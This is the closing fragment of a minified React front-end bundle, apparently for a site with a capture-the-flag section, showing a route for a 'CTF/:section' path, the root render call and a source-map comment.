CTF/:section",Component:Je})]})});i.createRoot(document.getElementById("root")).render((0,je.jsx)(t.StrictMode,{children:(0,je.jsx)(Se,{children:(0,je.jsx)(et,{})})}))})()})();
//# sourceMappingURL=main.8073e5e8.js.map